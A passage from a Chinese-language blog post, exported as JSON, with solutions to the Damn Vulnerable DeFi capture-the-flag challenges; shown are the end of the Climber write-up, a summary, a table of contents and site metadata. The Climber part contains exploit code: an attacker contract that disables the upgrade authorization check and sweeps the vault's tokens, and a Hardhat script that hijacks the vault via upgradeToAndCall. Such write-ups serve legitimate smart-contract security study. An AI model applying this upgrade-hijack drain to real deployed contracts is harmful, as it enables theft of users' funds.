class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> token<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Transfer failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_authorizeUpgrade</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> newImplementation<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span>  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n     <span class=\"token keyword\">function</span> <span class=\"token function\">__Ownable_init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n     <span class=\"token keyword\">function</span> <span class=\"token function\">__UUPSUpgradeable_init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\">const attackclimber <span class=\"token operator\">=</span> await ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'attackclimber'</span><span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>attackc <span class=\"token operator\">=</span> await attackclimber<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>vault<span class=\"token punctuation\">.</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>timelock<span class=\"token punctuation\">.</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        await <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>attackc<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">attack</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        const VaultV2 <span class=\"token operator\">=</span> await ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'UpgradedAttacker'</span><span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>vaultV2 <span class=\"token operator\">=</span> await VaultV2<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        const vaultV2Interface <span class=\"token operator\">=</span> VaultV2<span class=\"token punctuation\">.</span><span class=\"token keyword\">interface</span><span class=\"token punctuation\">;</span>\n        const data <span class=\"token operator\">=</span> vaultV2Interface<span class=\"token punctuation\">.</span><span class=\"token function\">encodeFunctionData</span><span class=\"token punctuation\">(</span><span class=\"token string\">'sweepFunds'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        await <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>vault<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">upgradeToAndCall</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>vaultV2<span class=\"token punctuation\">.</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>这个题库做到这里就已经结束了，相比之前做过的其他的题库，这个系列难度要更高一些，代码审计量也相对提升。做起来还是有些困难，但是还是学到了许多新的东西。</p>\n","text":" 地址：https://www.damnvulnerabledefi.xyz/ 1.Unstoppable 题目要求： There’s a lending pool with a million DVT tokens in balance, offering flash loan...","link":"","photos":[],"count_time":{"symbolsCount":"70k","symbolsTime":"1:03"},"categories":[],"tags":[{"name":"区块链","slug":"区块链","count":17,"path":"api/tags/区块链.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#1-Unstoppable\"><span class=\"toc-text\">1.Unstoppable</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#code\"><span class=\"toc-text\">code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#analyze\"><span class=\"toc-text\">analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#attack\"><span class=\"toc-text\">attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#2-Naive-receiver\"><span class=\"toc-text\">2.Naive receiver</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#FlashLoanReceiver-code\"><span class=\"toc-text\">FlashLoanReceiver  code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#NaiveReceiverLenderPool-code\"><span class=\"toc-text\">NaiveReceiverLenderPool  code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#analyze-1\"><span class=\"toc-text\">analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#attack-1\"><span class=\"toc-text\">attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#3-Truster\"><span class=\"toc-text\">3.Truster</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#code-1\"><span class=\"toc-text\">code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#analyze-2\"><span class=\"toc-text\">analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#attack-2\"><span class=\"toc-text\">attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#4-Side-entrance\"><span class=\"toc-text\">4.Side entrance</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#code-2\"><span class=\"toc-text\">code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#analyze-3\"><span class=\"toc-text\">analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#attack-3\"><span class=\"toc-text\">attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#5-The-rewarder\"><span class=\"toc-text\">5.The rewarder</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#code-3\"><span class=\"toc-text\">code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#analyze-4\"><span class=\"toc-text\">analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#attack-4\"><span class=\"toc-text\">attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#6-Selfie\"><span class=\"toc-text\">6.Selfie</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SelfiePool-code\"><span class=\"toc-text\">SelfiePool code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SimpleGovernance-code\"><span class=\"toc-text\">SimpleGovernance code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#analyze-5\"><span class=\"toc-text\">analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#attack-5\"><span class=\"toc-text\">attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#7-Compromised\"><span class=\"toc-text\">7.Compromised</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Exchange-code\"><span class=\"toc-text\">Exchange code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#TrustfulOracle-code\"><span class=\"toc-text\">TrustfulOracle code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#analyze-6\"><span class=\"toc-text\">analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#attack-6\"><span class=\"toc-text\">attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#8-Puppet\"><span class=\"toc-text\">8.Puppet</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#code-4\"><span class=\"toc-text\">code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#analyze-7\"><span class=\"toc-text\">analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#attack-7\"><span class=\"toc-text\">attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#9-Puppet-v2\"><span class=\"toc-text\">9.Puppet v2</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#code-5\"><span class=\"toc-text\">code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#analyze-8\"><span class=\"toc-text\">analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#attack-8\"><span class=\"toc-text\">attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#10-Free-rider\"><span class=\"toc-text\">10.Free rider</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#FreeRiderNFTMarketplace-code\"><span class=\"toc-text\">FreeRiderNFTMarketplace code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#analyze-9\"><span class=\"toc-text\">analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#attack-9\"><span class=\"toc-text\">attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#11-Backdoor\"><span class=\"toc-text\">11.Backdoor</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#code-6\"><span class=\"toc-text\">code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#analyze-10\"><span class=\"toc-text\">analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#attack-10\"><span class=\"toc-text\">attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#12-Climber\"><span class=\"toc-text\">12.Climber</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ClimberVault-code\"><span class=\"toc-text\">ClimberVault code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ClimberTimelock-code\"><span class=\"toc-text\">ClimberTimelock code</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#analyze-11\"><span class=\"toc-text\">analyze</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#attack-11\"><span class=\"toc-text\">attack</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">总结</span></a></li></ol>","author":{"name":"bcYng","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"The 15th National College Student Information Security Competition","uid":"7a7dc284a8f031161ea186b2342a420d","slug":"The 15th National College Student Information Security Competition","date":"2022-08-02T02:49:40.287Z","updated":"2022-08-02T02:49:40.287Z","comments":true,"path":"api/articles/The 15th National College Student Information Security Competition.json","keywords":null,"cover":[],"text":" 周日打了一下2022国赛的区块链题目，拿出来分享一下 1.Codepragma solidity ^0.4.26; contract Lib &#123; uint public score; function setScore(uint _score) public &#12...","link":"","photos":[],"count_time":{"symbolsCount":"4.7k","symbolsTime":"4 mins."},"categories":[],"tags":[{"name":"区块链","slug":"区块链","count":17,"path":"api/tags/区块链.json"}],"author":{"name":"bcYng","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Defi Hack","uid":"68b9de7ae4d5b3763a05a9fb9f649b30","slug":"Defi Hack","date":"2022-08-02T02:46:57.436Z","updated":"2022-08-02T02:46:57.436Z","comments":true,"path":"api/articles/Defi Hack.json","keywords":null,"cover":[],"text":" 题库地址：https://www.defihack.xyz/ Defi Hack1.May The Force Be With You RequestA long time ago in a galaxy far, far away… a new DAO was created...","link":"","photos":[],"count_time":{"symbolsCount":"53k","symbolsTime":"48 mins."},"categories":[],"tags":[{"name":"区块链","slug":"区块链","count":17,"path":"api/tags/区块链.json"}],"author":{"name":"bcYng","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}